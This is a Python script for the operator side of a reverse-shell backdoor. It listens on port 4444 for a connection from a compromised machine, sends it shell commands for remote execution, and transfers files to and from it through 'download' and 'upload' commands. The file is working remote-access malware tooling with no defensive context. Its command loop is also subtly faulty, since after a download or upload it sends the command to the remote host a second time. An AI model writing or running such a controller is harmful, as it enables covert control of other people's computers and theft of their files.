import socket
import json
class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[*] Waiting for the connection...\n")
        self.connection,address= listener.accept()
        print("[-] Got Connection..\n")
    
    def reliable_send(self,data):
        json_data=json.dumps(data)
        json_data=json_data.encode('ascii')
        self.connection.send(json_data)
        #print(f"\n Data Sent : {json_data}")
    
    
    def reliable_recv(self):
        json_data=""
        while True:
            try:
                json_data+=self.connection.recv(1024).decode('ascii')
                return json.loads(json_data)
            except ValueError :
                continue


    def read_file(self,path):
        with open(path,"rb") as file:
            return file.read()
    

    def write_file(self,path, data):
        print("Downloading..",path)
        with open(path,"wb") as file:
            file.write(data.encode())
            return "[+] Download Successful "
    
    
    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0]=='quit':
            return
        return self.reliable_recv()
    def run(self):
        while True:
            print("==>>",end=" ")
            command=list(map(str,input().split()))
            if command[0]=="quit":
                result=self.execute_remotely(command)
                self.connection.close()
                exit()
            elif command[0]=='download':
                result=self.execute_remotely(command)
                result=self.write_file(command[1],result)
            elif command[0]=="upload":
                data=self.read_file(command[1])
                temp=[command[0],command[1],data]
                result=self.execute_remotely(temp)
            result=self.execute_remotely(command)
            print(result)

ip=((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])

my_listener=Listener(ip,4444)

my_listener.run()
#listener.bind(('192.168.154.133',4444))